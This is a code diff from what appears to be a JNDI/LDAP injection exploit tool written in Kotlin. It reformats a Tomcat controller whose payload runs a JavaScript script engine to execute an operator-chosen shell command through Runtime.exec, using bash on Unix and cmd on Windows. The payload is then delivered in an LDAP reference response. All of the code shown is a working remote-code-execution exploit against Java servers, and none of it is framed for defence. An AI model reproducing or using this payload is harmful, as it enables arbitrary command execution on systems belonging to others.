@@ -13,24 +13,27 @@ import javax.naming.StringRefAddr
 @LDAPMapping(["/tomcat"])
 class Tomcat : Controller {
 
-    private val jsStr = """var strs=new Array(3);
-        |if(java.io.File.separator.equals('/')) {
-        |    strs[0]='/bin/bash';
-        |    strs[1]='-c';
-        |    strs[2]='${Options.command}';
-        |} else {
-        |    strs[0]='cmd';
-        |    strs[1]='/C';
-        |    strs[2]='${Options.command}';
-        |}
-        |java.lang.Runtime.getRuntime().exec(strs);
-    """.trimMargin().replace("\n", "")
+    private val jsStr = """
+        var strs=new Array(3);
+        if(java.io.File.separator.equals('/')) {
+            strs[0]='/bin/bash';
+            strs[1]='-c';
+            strs[2]='${Options.command}';
+        } else {
+            strs[0]='cmd';
+            strs[1]='/C';
+            strs[2]='${Options.command}';
+        }
+        java.lang.Runtime.getRuntime().exec(strs);
+    """.trimIndent()
 
-    private val payload = """{
-        |"".getClass().forName("javax.script.ScriptEngineManager")
-        |.newInstance().getEngineByName("JavaScript")
-        |.eval("$jsStr")}
-    """.trimMargin().replace("\n", "")
+    private val payload = """
+        {
+            "".getClass().forName("javax.script.ScriptEngineManager")
+            .newInstance().getEngineByName("JavaScript")
+            .eval("$jsStr")
+        }
+    """.trimIndent().replace("\n", "")
 
     override fun sendResult(result: InMemoryInterceptedSearchResult, base: String) {
         val ref = ResourceRef(
